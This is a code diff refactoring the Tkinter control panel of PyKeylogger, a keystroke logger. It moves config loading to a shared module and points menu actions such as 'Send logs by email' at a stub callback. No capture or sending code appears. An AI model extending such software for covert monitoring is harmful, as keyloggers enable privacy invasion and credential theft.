@@ -34,12 +34,14 @@ from supportscreen import AboutDialog
 import sys
 import version
 import os.path
+from myutils import _settings, _cmdoptions
 
 class PyKeyloggerControlPanel:
-    def __init__(self, cmdoptions, mainapp):
-        self.cmdoptions=cmdoptions
+    def __init__(self, mainapp):
         self.mainapp=mainapp
-        self.panelsettings=ConfigObj(self.cmdoptions.configfile, configspec=self.cmdoptions.configval, list_values=False)
+        self.panelsettings=ConfigObj(_cmdoptions['cmdoptions'].configfile, 
+                configspec=_cmdoptions['cmdoptions'].configval, 
+                list_values=False)
 
         self.root = Tk()
         self.root.config(height=20, width=20)
@@ -74,13 +76,13 @@ class PyKeyloggerControlPanel:
 
         actionmenu = Menu(menu)
         menu.add_cascade(label="Actions", menu=actionmenu)
-        actionmenu.add_command(label="Flush write buffers", command=Command(self.mainapp.lw.FlushLogWriteBuffers, "Flushing write buffers at command from control panel."))
-        actionmenu.add_command(label="Zip Logs", command=Command(self.mainapp.lw.ZipLogFiles))
-        actionmenu.add_command(label="Send logs by email", command=Command(self.mainapp.lw.SendZipByEmail))
+        actionmenu.add_command(label="Flush write buffers", command=self.callback)
+        actionmenu.add_command(label="Zip Logs", command=self.callback)
+        actionmenu.add_command(label="Send logs by email", command=self.callback)
         #actionmenu.add_command(label="Upload logs by FTP", command=self.callback) #do not have this method yet
         #actionmenu.add_command(label="Upload logs by SFTP", command=self.callback) # do not have this method yet
-        actionmenu.add_command(label="Delete logs older than " + self.panelsettings['Log Maintenance']['Max Log Age'] + " days", command=Command(self.mainapp.lw.DeleteOldLogs))
-        actionmenu.add_command(label="Rotate logfile", command=Command(self.mainapp.lw.RotateLogs))
+        actionmenu.add_command(label="Delete logs older than X days", command=self.callback)
+        actionmenu.add_command(label="Rotate logfile", command=self.callback)
         actionmenu.add_separator()
         actionmenu.add_command(label="Close Control Panel", command=self.ClosePanel)
         actionmenu.add_command(label="Quit PyKeylogger", command=self.mainapp.stop)
@@ -127,7 +129,9 @@ class PyKeyloggerControlPanel:
         # reload the settings so that we are reading from the file, 
         # rather than from the potentially modified but not yet written out configobj
         del(self.panelsettings)
-        self.panelsettings=ConfigObj(self.cmdoptions.configfile, configspec=self.cmdoptions.configval, list_values=False)
+        self.panelsettings=ConfigObj(_cmdoptions['cmdoptions'].configfile, 
+                configspec=_cmdoptions['cmdoptions'].configval, 
+                list_values=False)
         
         self.configpanel = ConfigPanel(self.root, title=section + " Settings", settings=self.panelsettings, section=section)
         
